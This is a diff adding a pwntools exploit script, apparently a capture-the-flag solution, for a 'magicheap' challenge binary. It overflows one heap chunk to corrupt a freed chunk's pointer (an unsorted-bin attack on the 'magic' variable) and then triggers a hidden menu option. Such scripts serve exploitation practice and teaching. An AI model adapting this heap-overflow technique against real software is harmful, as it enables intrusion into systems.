@@ -1,0 +1,41 @@
+from pwn import *
+
+e = ELF("./magicheap_patched")
+libc = ELF("./libc-2.23.so")
+ld = ELF("./ld-2.23.so")
+
+script = '''
+break *0x400BE0
+break *0x400B2B
+break *0x400A1B
+'''
+p = process("./magicheap_patched")
+#p = gdb.debug("./magicheap_patched", gdbscript = script)
+
+def create_heap(size, data):
+    p.sendafter(b"choice :", b"1")
+    p.sendafter(b"Heap : ", f"{size}".encode())
+    p.sendafter(b"heap:", data)
+
+def edit_heap(index, size, data):
+    p.sendafter(b"choice :", b"2")
+    p.sendafter(b"Index :", f"{index}".encode())
+    p.sendafter(b"Heap : ", f"{size}".encode())
+    p.sendafter(b"heap : ", data)
+
+def delete_heap(index):
+    p.sendafter(b"choice :", b"3")
+    p.sendafter(b"Index :", f"{index}".encode())
+    
+create_heap(0x80, b"A" * 8)
+create_heap(0x80, b"A" * 8)
+create_heap(0x80, b"A" * 8)
+
+delete_heap(1)
+payload = b"A" * 8 + b"\x00" * 0x80 + p64(0x91) + b"A" * 8 + p64(e.symbols['magic'] - 0x10)
+edit_heap(0, len(payload), payload)
+
+create_heap(0x80, b"A" * 8)
+p.sendafter(b"choice :", b"4869")
+
+p.interactive()
